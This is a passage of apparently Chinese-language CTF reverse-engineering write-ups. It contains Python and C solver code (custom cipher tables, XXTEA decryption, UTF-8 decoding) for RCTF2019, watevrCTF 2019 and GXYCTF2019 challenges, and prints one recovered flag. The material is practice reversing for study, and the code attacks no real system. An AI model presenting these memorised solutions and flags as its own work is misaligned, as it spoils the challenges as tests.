class="number">0xC6C9C4DE</span>,<span class="number">0xED342C68</span>,<span class="number">0x4C6C704C</span>,<span class="number">0xB2D7B5DB</span>,<span class="number">0xACCEAA9C</span>,<span class="number">0xD08C1AF8</span>,<span class="number">0x836B6CF0</span>,<span class="number">0x2EC53D53</span>,<span class="number">0xE5642FA1</span>,<span class="number">0x84EA2D1A</span>,<span class="number">0x17DFE4B9</span>,<span class="number">0xD7B34225</span>,<span class="number">0xD5D63737</span>,<span class="number">0x4E4E04B0</span>,<span class="number">0xCF55CF68</span>,<span class="number">0xD4A8DB0D</span>,<span class="number">0x0C012C96</span>,<span class="number">0x381568E3</span>,<span class="number">0x9236A510</span>,<span class="number">0xA5A264AF</span>,<span class="number">0xA4B97409</span>,<span class="number">0xD5D5C8CB</span>,<span class="number">0xF85BB6D8</span>,<span class="number">0xB017FD3D</span>,<span class="number">0x2E910D94</span>,<span class="number">0x707DD1E0</span>,<span class="number">0x5393787D</span>,<span class="number">0xD66A707C</span>,<span class="number">0xB48C276E</span>,<span class="number">0x47E94C4E</span>,<span class="number">0x656D90D5</span>,<span class="number">0xBC465549</span>,<span class="number">0xC94BD5A6</span>,<span class="number">0x1C60AFAC</span>,<span class="number">0x3C9AA09C</span>,<span class="number">0x3DFDB235</span>,<span class="number">0x3B21C194</span>,<span class="number">0x5787CDF2</span>,<span class="number">0x3532F09D</span>,<span class="number">0x4BE4DEB6</span>,<span class="number">0x44AD4BF8</span>,<span class="number">0xB36A893D</span>,<span class="number">0x821CBE39</span>,<span class="number">0x20B711AA</span>,<span class="number">0x77F2CF00</span>,<span class="number">0x8C3FB88A</span>,<span class="number">0xC0B9B168</span>,<span class="number">0x5D245929</span>,<span class="number">0xB7D5DAFB</span>,<span class="number">0x859D8F29</span>]</span><br><span class="line">v56 = [<span class="number">0xDA579091</span>,<span class="number">0x36589232</span>,<span class="number">0xE7B84792</span>,<span class="number">0x78E07F17</span>,<span class="number">0x36FA15A6</span>,<span class="number">0xF0427E9F</span>,<span class="number">0x71406628</span>,<span class="number">0xFA9B4784</span>,<span class="number">0xF2655356</span>,<span class="number">0x995944EC</span>,<span class="number">0x437C367D</span>,<span class="number">0xDBCDE65B</span>,<span class="number">0x6BA84E55</span>,<span class="number">0x308D07AE</span>,<span class="number">0x3DA486BB</span>,<span class="number">0x04E21B79</span>,<span class="number">0x6CE11C5B</span>,<span class="number">0x16ED3875</span>,<span class="number">0x883B60BA</span>,<span class="number">0xFB72C8DF</span>,<span class="number">0x4A086E1B</span>,<span class="number">0x9DC7E017</span>,<span class="number">0xF8DA215B</span>,<span class="number">0x0D5C5718</span>,<span class="number">0x68A5E75A</span>,<span class="number">0x920DD029</span>,<span class="number">0x8BDBB753</span>,<span class="number">0x523F494F</span>,<span class="number">0xF7038820</span>,<span class="number">0x8F173C5F</span>,<span class="number">0xE7B9C003</span>,<span class="number">0x0A175A5B</span>,<span class="number">0x783E2CCF</span>,<span class="number">0xCE606562</span>,<span class="number">0x746082D0</span>,<span class="number">0xF5E4B9B3</span>,<span class="number">0x8D3FE374</span>,<span class="number">0x38A38F39</span>,<span class="number">0xAD82BBDD</span>,<span class="number">0xAFD383B2</span>,<span class="number">0x00792D15</span>,<span class="number">0x0D18FDA0</span>,<span class="number">0x75413917</span>,<span class="number">0xCC60E9AB</span>,<span class="number">0x64AB36FA</span>,<span class="number">0x1B7C0F0B</span>,<span class="number">0x83810F82</span>,<span class="number">0x150942AA</span>,<span class="number">0x5E65471A</span>,<span class="number">0xC1CA3BD4</span>,<span class="number">0x29746D45</span>,<span class="number">0x09DAE078</span>,<span class="number">0x2919D6A8</span>,<span class="number">0x396F2A25</span>,<span class="number">0x536A4D3C</span>,<span class="number">0x579DAD7A</span>,<span class="number">0xCBC13F7D</span>,<span class="number">0x9F7ACA79</span>,<span class="number">0xA3E33AD9</span>,<span class="number">0x4455D4BF</span>,<span class="number">0x9DF3512E</span>,<span class="number">0xE8ADFADA</span>,<span class="number">0x1F28C704</span>,<span class="number">0x2EBCE471</span>,<span class="number">0xADC7D412</span>,<span class="number">0x5DF3B361</span>,<span class="number">0xD7BA20F0</span>,<span class="number">0xDB88BDB5</span>,<span class="number">0x04DAF222</span>,<span class="number">0x98D7B48E</span>,<span class="number">0x1F900BDB</span>,<span class="number">0xC34AC529</span>,<span class="number">0xFD3F8659</span>,<span class="number">0x12C202E7</span>,<span class="number">0x974775B5</span>,<span class="number">0xA511DC77</span>,<span class="number">0x59EDD580</span>,<span class="number">0xF69A10B5</span>,<span class="number">0x79EA901A</span>,<span class="number">0x64DF1444</span>,<span class="number">0x66C7B59B</span>,<span class="number">0xEBF10CB2</span>,<span class="number">0x769C7B29</span>,<span class="number">0xE5AF6BF1</span>,<span class="number">0xA1B398CF</span>,<span class="number">0xE16484A8</span>,<span class="number">0xB7764140</span>,<span class="number">0xF101A355</span>,<span class="number">0x37D24DD7</span>,<span class="number">0x7CAA2209</span>,<span class="number">0xFB8F2F11</span>,<span class="number">0xE69C7211</span>,<span class="number">0x12811348</span>,<span class="number">0xC0E9EA5E</span>,<span class="number">0xB7925FB8</span>,<span class="number">0x3C88C806</span>,<span class="number">0x0159C9E4</span>,<span class="number">0xC616699E</span>,<span class="number">0xACD60B32</span>,<span class="number">0xB30DDE1A</span>,<span class="number">0xDF39517E</span>,<span class="number">0xB93DEE31</span>,<span class="number">0x6E86159B</span>,<span class="number">0xC3616961</span>,<span class="number">0xB6C89355</span>,<span class="number">0x12AAC939</span>,<span class="number">0x3664BC33</span>,<span class="number">0x45E4BDC6</span>,<span class="number">0xE1719D67</span>,<span class="number">0x524055CA</span>,<span class="number">0xA839D8EB</span>,<span class="number">0x51EA04AD</span>,<span class="number">0xA6A4D406</span>,<span class="number">0xAD8832E3</span>,<span class="number">0xCA852837</span>,<span class="number">0xE142A6E3</span>,<span class="number">0xA1A400D6</span>,<span class="number">0xFA35744D</span>,<span class="number">0xBEF1E464</span>,<span class="number">0x997B4AF8</span>,<span class="number">0x6D40427C</span>,<span class="number">0xBF8974D3</span>,<span class="number">0x39A896F7</span>,<span class="number">0xCDACF64D</span>,<span class="number">0xA42E80DA</span>,<span class="number">0xE4461B32</span>,<span class="number">0xCCAD0577</span>,<span class="number">0xD895E7BD</span>,<span class="number">0x7DBB265A</span>,<span class="number">0x65852658</span>,<span class="number">0xCDA62FDE</span>,<span class="number">0xFAD0669E</span>,<span class="number">0x4B3CE34E</span>,<span class="number">0xE05C7C73</span>,<span class="number">0xD891CD5C</span>,<span class="number">0x4FC4AA4B</span>,<span class="number">0x0D1DC690</span>,<span class="number">0x57BEED7D</span>,<span class="number">0xDD09631E</span>,<span class="number">0x5DABD689</span>,<span class="number">0xD39B2958</span>,<span class="number">0x72441210</span>,<span class="number">0xD7E9B2E8</span>,<span class="number">0xA7B762E5</span>,<span class="number">0x0494F61F</span>,<span class="number">0x53A5E356</span>,<span class="number">0xF7978852</span>,<span class="number">0xB324B320</span>,<span class="number">0x13F42919</span>,<span class="number">0xA9F7BE79</span>,<span class="number">0x446D36E7</span>,<span class="number">0xA8445880</span>,<span class="number">0x1C1CA702</span>,<span class="number">0x13C2ACA2</span>,<span class="number">0xEB066DD4</span>,<span class="number">0x7891D1DC</span>,<span class="number">0x65AD6853</span>,<span class="number">0xB3D70960</span>,<span class="number">0x8B6FA2C7</span>,<span class="number">0xC62583D6</span>,<span class="number">0x5AD90C97</span>,<span class="number">0x3423D303</span>,<span class="number">0xC2E13FE7</span>,<span class="number">0xD265DE71</span>,<span class="number">0xEB31AA78</span>,<span class="number">0x7582CFDF</span>,<span class="number">0x0427E371</span>,<span class="number">0x76495A72</span>,<span class="number">0x4B47B543</span>,<span class="number">0x767211EC</span>,<span class="number">0x5EEC75DB</span>,<span class="number">0xBC0281A3</span>,<span class="number">0x3100BEDA</span>,<span class="number">0x9BF13F32</span>,<span class="number">0x4625717F</span>,<span class="number">0x110DB24A</span>,<span class="number">0x0E55CE10</span>,<span class="number">0xF4FBB28F</span>,<span class="number">0x8B75227D</span>,<span class="number">0xC3DA7A8A</span>,<span class="number">0xB826CA8F</span>,<span class="number">0x5D8D6195</span>,<span class="number">0xE0029488</span>,<span class="number">0x888055C5</span>,<span class="number">0x781F037A</span>,<span class="number">0xC9F5486A</span>,<span class="number">0xCDF260D9</span>,<span class="number">0xCC30B60F</span>,<span class="number">0x4462550C</span>,<span class="number">0x688C013A</span>,<span class="number">0x9A44D732</span>,<span class="number">0xB0389A34</span>,<span class="number">0x60BA7236</span>,<span class="number">0xFE758D77</span>,<span class="number">0xDFF7E69A</span>,<span class="number">0xF6159765</span>,<span class="number">0x824DF1A0</span>,<span class="number">0x7634D70C</span>,<span class="number">0xC90EA62F</span>,<span class="number">0x600B3B99</span>,<span class="number">0x886F8556</span>,<span class="number">0xC66BAF96</span>,<span class="number">0x52E382AF</span>,<span class="number">0x733CAAD9</span>,<span class="number">0x9B92D0A5</span>,<span class="number">0xCFB3E9CA</span>,<span class="number">0xEB0AD91A</span>,<span class="number">0xD80D780F</span>,<span class="number">0x399C80F5</span>,<span class="number">0xDC9DF1A6</span>,<span class="number">0x319E19B4</span>,<span class="number">0x7E0D0F72</span>,<span class="number">0x03CC646D</span>,<span class="number">0x701A7074</span>,<span class="number">0x5263E055</span>,<span class="number">0xA4FD7B32</span>,<span class="number">0x9C8ACE37</span>,<span class="number">0xE853F925</span>,<span class="number">0x4F4C4C80</span>,<span class="number">0x73502E76</span>,<span class="number">0x341064E2</span>,<span class="number">0xEDF99D78</span>,<span class="number">0x7ED987B6</span>,<span class="number">0xC3B0C7C8</span>,<span class="number">0x28AE1BD0</span>,<span class="number">0x87B50B85</span>,<span class="number">0xB0E2F87D</span>,<span class="number">0xA95837A8</span>,<span class="number">0x84788413</span>,<span class="number">0xA56C5CF9</span>,<span class="number">0xB3EACFE6</span>,<span class="number">0x2820F4A1</span>,<span class="number">0xC690DC48</span>,<span class="number">0x63C0B2C0</span>,<span class="number">0x0B2794E7</span>,<span class="number">0x833C4137</span>,<span class="number">0xAA7F87B8</span>,<span class="number">0xC9E4252D</span>,<span class="number">0xAC459CCF</span>,<span class="number">0x57733C5F</span>,<span class="number">0xB83E0392</span>,<span class="number">0x64FAF7F2</span>,<span class="number">0xED2B2884</span>,<span class="number">0x8CEA3055</span>,<span class="number">0xC87B67C0</span>,<span class="number">0xE28ECB13</span>,<span class="number">0x0440A06E</span>,<span class="number">0x28164E5A</span>,<span class="number">0xF52FBC43</span>,<span class="number">0xC347BDE0</span>,<span class="number">0xA7463ACD</span>,<span class="number">0x4659105E</span>,<span class="number">0xFC68D479</span>,<span class="number">0x0D893FC0</span>,<span class="number">0xCDAA86FC</span>,<span class="number">0x1D380A6F</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t=<span class="string">b&#x27;ddddwwwaaawwwddd&#x27;</span></span><br><span class="line">ra = t[<span class="number">0</span>]|t[<span class="number">1</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">2</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">3</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">rb = t[<span class="number">4</span>]|t[<span class="number">5</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">6</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">7</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">rc = t[<span class="number">8</span>]|t[<span class="number">9</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">10</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">11</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">rd = t[<span class="number">12</span>]|t[<span class="number">13</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">14</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">15</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">swapByte = <span class="keyword">lambda</span> _x:(((_x&amp;<span class="number">0xff</span>)&lt;&lt;<span class="number">24</span>)|((_x&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((_x&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">8</span>)|((_x&amp;<span class="number">0xff00</span>)&lt;&lt;<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 v15=0xc3a86870 v16=0xC9BD8E1E v18=0xC9BD8E1E</span></span><br><span class="line"><span class="comment">#1 v15=0x88761BFB v16=0x8D68F881 v18=0x8D68F881</span></span><br><span class="line"><span class="comment">#0 v18=45B37198 v16=F9B8CE1A</span></span><br><span class="line"><span class="comment"># v18=8493F258 v16=91B112F8</span></span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x58f29384</span></span><br><span class="line">rb = <span class="number">0xf812b191</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    a = swapByte(a)</span><br><span class="line">    b = swapByte(b)</span><br><span class="line">    print(hex(a),hex(b))</span><br><span class="line">    a^=c1</span><br><span class="line">    b^=c2</span><br><span class="line">    a&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    print(hex(a),hex(b))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        x = a^c3[i]</span><br><span class="line">        x&amp;=<span class="number">0xffffffff</span></span><br><span class="line">        print(hex(v56[(a&amp;<span class="number">0xff</span>)]),hex(v55[(a&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>]),hex(v54[(a&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>]),hex(v53[(a&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>]))</span><br><span class="line">        y = b^(v56[(a&amp;<span class="number">0xff</span>)]+(v55[(a&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>]^(v54[(a&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>]+v53[(a&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>])))</span><br><span class="line">        y&amp;=<span class="number">0xffffffff</span></span><br><span class="line">        print(hex(x),hex(y))</span><br><span class="line">        a=y</span><br><span class="line">        b=x</span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;====================&#x27;</span>)</span><br><span class="line">ra,rb = change(ra,rb)</span><br><span class="line">print(<span class="string">&#x27;====================&#x27;</span>)</span><br><span class="line">rc,rd = change(rc,rd)</span><br><span class="line">print(<span class="string">&#x27;====================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(hex(ra),hex(rb),hex(rc),hex(rd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 605c5235 db824ef8 2ff8e087 b4bbacfa</span></span><br><span class="line"><span class="comment"># db824ef8605c5235b4bbacfa2ff8e087</span></span><br></pre></td></tr></table></figure>
<h2 id="rev-RCTF2019-babyre1"><a href="#rev-RCTF2019-babyre1" class="headerlink" title="[rev][RCTF2019]babyre1"></a>[rev][RCTF2019]babyre1</h2><ol>
<li>base16解码</li>
<li>xxtea解密</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;  </span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;  </span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  </span><br><span class="line">        sum = <span class="number">0</span>;  </span><br><span class="line">        z = v[n<span class="number">-1</span>];  </span><br><span class="line">        <span class="keyword">do</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            sum += DELTA;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)  </span><br><span class="line">            &#123;  </span><br><span class="line">                y = v[p+<span class="number">1</span>];  </span><br><span class="line">                z = v[p] += MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            y = v[<span class="number">0</span>];  </span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        n = -n;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  </span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[<span class="number">0</span>];  </span><br><span class="line">        <span class="keyword">do</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)  </span><br><span class="line">            &#123;  </span><br><span class="line">                z = v[p<span class="number">-1</span>];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            z = v[n<span class="number">-1</span>];  </span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> target[] = <span class="string">&quot;Bingo!\x00\x02&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        target[i]^=<span class="number">0x17</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,target);</span><br><span class="line">    printArray(<span class="string">&quot;flag_1&quot;</span>,target,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> k[] = &#123;<span class="number">0xE0C7E0C7</span>,<span class="number">0xC6F1D3D7</span>,<span class="number">0xC6D3C6D3</span>,<span class="number">0xC4D0D2CE</span>&#125;;</span><br><span class="line">    btea((<span class="keyword">uint32_t</span>*)target,<span class="number">2</span>,k);</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,target,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,((<span class="keyword">uint32_t</span>)target[i])&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出了Bingo!啊，为啥不对呢</p>
<p>看了答案，由于最后两位是未知的，并且缺少md5，所以错误。最后一位可以猜测出是\x02，倒数第二位真的需要md5了</p>
<h2 id="rev-watevrCTF-2019-Repyc"><a href="#rev-watevrCTF-2019-Repyc" class="headerlink" title="[rev][watevrCTF 2019]Repyc"></a>[rev][watevrCTF 2019]Repyc</h2><p>在线pyc反编译，然后打开发现是复杂的变量名</p>
<p>分析虚拟机架构，重命名各个变量</p>
<p>得到总流程，可是最后结果出不来，看答案说是编码问题。所以为啥先用utf-8编码再处理就可以了呢。然后尝试了utf-8编码再utf-8解码，得到的数值就不一样了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="string">b&#x27;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&#x27;</span></span><br><span class="line">a=[]</span><br><span class="line">f = str(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(bytes(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(f)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    a.append((ord(i)+<span class="number">15</span>)^<span class="number">135</span>)</span><br><span class="line">print()</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>
<p>watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0}</p>
<h2 id="rev-GXYCTF2019-minecraft"><a href="#rev-GXYCTF2019-minecraft" class="headerlink" title="[rev][GXYCTF2019]minecraft"></a>[rev][GXYCTF2019]minecraft</h2><ol>
<li>先判断长度为&gt;5 &lt;33</li>
<li>base64编码</li>
<li>爆破(没想到爆破速度这么快)</li>
</ol>
